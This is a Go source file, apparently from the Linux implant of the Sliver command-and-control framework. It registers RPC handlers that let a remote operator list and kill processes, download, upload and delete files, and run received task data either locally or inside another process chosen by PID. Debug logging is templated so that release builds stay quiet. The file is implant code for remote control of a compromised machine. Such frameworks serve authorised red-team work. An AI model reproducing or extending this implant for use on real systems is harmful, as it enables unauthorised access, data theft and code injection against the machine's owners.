package handlers

import (
	"log"
	pb "sliver/protobuf/sliver"
	"sliver/sliver/taskrunner"

	"github.com/golang/protobuf/proto"
)

var (
	linuxHandlers = map[uint32]RPCHandler{
		pb.MsgPsReq:       psHandler,
		pb.MsgPing:        pingHandler,
		pb.MsgKill:        killHandler,
		pb.MsgLsReq:       dirListHandler,
		pb.MsgDownloadReq: downloadHandler,
		pb.MsgUploadReq:   uploadHandler,
		pb.MsgCdReq:       cdHandler,
		pb.MsgPwdReq:      pwdHandler,
		pb.MsgRmReq:       rmHandler,
		pb.MsgMkdirReq:    mkdirHandler,
		pb.MsgTask:        taskHandler,
		pb.MsgRemoteTask:  remoteTaskHandler,
	}
)

func GetSystemHandlers() map[uint32]RPCHandler {
	return linuxHandlers
}

func taskHandler(data []byte, resp RPCResponse) {
	task := &pb.Task{}
	err := proto.Unmarshal(data, task)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	err = taskrunner.LocalTask(task.Data)
	resp([]byte{}, err)
}

func remoteTaskHandler(data []byte, resp RPCResponse) {
	remoteTask := &pb.RemoteTask{}
	err := proto.Unmarshal(data, remoteTask)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data)
	resp([]byte{}, err)
}
